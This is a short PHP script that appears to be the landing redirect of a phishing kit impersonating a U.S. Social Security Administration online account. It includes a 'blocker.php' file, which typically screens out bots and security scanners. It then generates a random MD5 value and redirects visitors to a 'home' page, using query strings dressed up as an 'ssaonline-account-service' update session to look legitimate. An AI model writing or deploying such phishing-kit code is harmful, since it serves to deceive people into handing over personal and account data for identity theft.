<?php

include('blocker.php');
	
	$praga=rand();
	$praga=md5($praga);

	header("location: home?cmd=www.ssaonline-account-service.com-update_submit&id=$praga$praga&session=$praga$praga");


?>